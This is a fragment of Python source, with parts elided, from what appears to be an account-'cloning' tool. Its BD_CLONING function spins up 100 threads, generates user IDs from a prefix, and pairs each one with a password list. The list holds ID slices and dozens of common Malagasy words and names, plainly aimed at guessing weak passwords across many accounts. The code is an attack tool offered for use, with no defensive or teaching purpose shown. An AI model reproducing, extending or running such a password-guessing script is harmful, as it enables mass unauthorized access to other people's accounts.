...
def BD_CLONING():
    ...
    with tred(max_workers=100) as Dipto:
        ...
        for psx in user:
            ids=code+psx
            passlist=[psx,ids,ids[:6],ids[:6],ids[5:],ids[6:],'fanantenana','Fanantenana','mamako','Mamako','nirina','Nirina','mamiko','Mamiko','malala','Malala','malalako','Malalako','malagasy','Malagasy','malala','fitiavana','Fitiavana','tantely','Tantely','badoda','Badoda','mendrika', 'Mendrika','antananarivo','Antananarivo','marary','Marary','milely','Milely','Hanitra',  'Vadiko','vadiko','jesosy','mahery','Henintsoa','Mahery','henintsoa','mahaleo','hanitra', 'vadiko','jesosy','mahery','Fandresena','fandresena','henintsoa','mahaleo',   'miangaly','nomena','nantenaina','Nantenaina','sarobidy','fanomezana', 'Fanomezana'    'fanomezantsoa','Fanomezantsoa','tsiory','Tsiaro','bonjour','madagasikara','mamasosy','tiavina','papasosy','Tahiana','tahiana','tantely','felana','Tsilavina', 'Tsilavina','Nekena'   'nekena','finoana','fanantenana','harena','anjara','vololona', 'liantsoa','tanjona','fifaliana','je t\'aime','fanomezana','narindra',  'mirindra','lalaina','voahangy','iharitiana','mamisoa','mamatsoa',  'sitraka','herilaza','herilaza','cedrick','nasaina','nandrianina',  'tafita','safidy','fenosoa','domoina','hasina','nilaina'] 
